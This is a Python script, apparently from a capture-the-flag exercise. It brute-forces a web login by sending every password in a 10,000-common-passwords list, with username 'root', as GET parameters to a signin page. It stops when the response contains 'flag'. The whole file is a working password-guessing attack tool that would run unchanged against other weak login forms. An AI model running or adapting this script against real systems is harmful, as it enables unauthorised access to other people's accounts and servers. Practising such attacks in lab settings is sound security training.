#!/usr/bin/env python3

import glob
import argparse
import requests

URL = None
PARAMS = {"page":"signin", "Login":"Login", "username":"root"}

def check(password):
    PARAMS["password"] = password
    r = requests.get(URL, PARAMS)
    if "flag" in r.text:
        return True
    return False

def find_file_path_from_current_dir():
    return glob.glob("./**/" + "10k-most-common.txt", recursive=True)[0]

def main():
    with open(find_file_path_from_current_dir(), "r") as file:
        while True:
            password = file.readline()
            if password:
                if check(password.strip("\n")):
                    print(f"Found it => {password}")
                    break
                else:
                    print(f"Nope for => {password}")
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Find the right password")
    parser.add_argument("URL", help="URL address of the server")
    args = parser.parse_args()
    URL = args.URL
    main()
